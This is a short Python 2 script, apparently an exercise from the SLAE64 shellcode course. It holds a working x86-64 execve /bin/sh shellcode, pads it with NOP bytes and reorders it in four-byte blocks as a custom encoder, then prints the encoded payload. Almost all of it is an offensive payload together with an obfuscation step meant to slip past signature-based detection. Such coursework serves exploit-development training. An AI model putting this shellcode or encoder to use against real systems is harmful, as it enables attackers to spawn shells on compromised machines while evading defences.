#execve stack shellcode value from SLAE64 course
import binascii

j = 3
i = 0
shellcode = "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"
shellarray = bytearray(shellcode)
length = len(shellarray)
encoded = []

encoded_shellcode = shellcode.encode('hex')
input = "Input:"+ r"\x" + r"\x".join(encoded_shellcode[n:n+2] for n in range(0, len(encoded_shellcode),2))
print input

#print "Old length: %s" % length

if (length%4 != 0):
	adding = 4 -(length%4)
	for i in range (adding):
		shellarray.append(0x90)

#print "New length with \\x90-s appended: %s" % len(shellarray)

#changing positions
while(j <= len(shellarray)):
	for i in range(4):
		encoded.append(shellarray[j-i])
	j = j + 4

output = binascii.hexlify(bytearray(encoded))
result = "Output" + r"\x" + r"\x".join(output[n : n+2] for n in range(0, len(output), 2))
print result
